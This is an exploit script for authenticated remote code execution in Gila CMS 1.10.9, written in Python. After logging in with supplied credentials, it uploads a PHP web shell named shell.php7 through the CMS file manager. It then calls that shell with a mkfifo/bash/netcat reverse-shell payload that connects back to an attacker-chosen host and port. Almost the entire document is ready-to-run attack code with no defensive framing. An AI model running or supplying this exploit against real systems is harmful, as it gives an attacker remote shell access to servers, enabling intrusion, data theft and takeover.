# Exploit Title: Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)
# Exploit Author: Osman Tunahan ARIKAN
# Vendor Homepage: https://gilacms.com/
# Software Link: https://github.com/GilaCMS/gila/
# Version: Gila 1.10.9
# Tested on: Linux

from urllib.parse import urlparse
import requests
import argparse

def get_domain_from_url(url):
    parsed_url = urlparse(url)
    return parsed_url.netloc

def login(args):
    session = requests.Session()
    login_payload = {'action': 'login', 'username': args.username, 'password': args.password}
    response = session.post(args.target, data=login_payload)
    response.raise_for_status()
    return session

def upload_payload(args, session):
    payload = f"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+{args.lhost}+{args.lport}+>/tmp/f"
    payload_url = f"{args.target}tmp/shell.php7?cmd={payload}"

    upload_url = f"{args.target}fm/upload"
    upload_headers = {
        "Host": get_domain_from_url(args.target),
        "Content-Length": "424",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarynKy5BIIJQcZC80i2",
        "Accept": "*/*",
        "Origin": args.target,
        "Referer": f"{args.target}admin/fm?f=tmp/.htaccess",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": f"PHPSESSID={session.cookies.get('PHPSESSID')}; GSESSIONID={session.cookies.get('GSESSIONID')}",
        "Connection": "close"
    }

    upload_data = '''
    ------WebKitFormBoundarynKy5BIIJQcZC80i2
    Content-Disposition: form-data; name="uploadfiles"; filename="shell.php7"
    Content-Type: application/x-php

    <?php system($_GET["cmd"]);?>

    ------WebKitFormBoundarynKy5BIIJQcZC80i2
    Content-Disposition: form-data; name="path"

    tmp
    ------WebKitFormBoundarynKy5BIIJQcZC80i2
    Content-Disposition: form-data; name="g_response"

    content
    ------WebKitFormBoundarynKy5BIIJQcZC80i2--
    '''

    upload_response = session.post(upload_url, headers=upload_headers, data=upload_data)
    upload_response.raise_for_status()

    if upload_response.status_code == 200:
        print("File uploaded successfully.")
        response = session.get(payload_url)
        print("Payload executed successfully.")
    else:
        print("Error uploading the file:", upload_response.text)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Gila CMS - Remote Code Execution Exploit')
    parser.add_argument('target', help='Target login URL (e.g., http://example.com/admin/)')
    parser.add_argument('--username', required=True, help='Login username')
    parser.add_argument('--password', required=True, help='Login password')
    parser.add_argument('--lhost', required=True, help='Local IP (LHOST)')
    parser.add_argument('--lport', required=True, help='Local port (LPORT)')
    
    args = parser.parse_args()

    session = login(args)
    upload_payload(args, session)
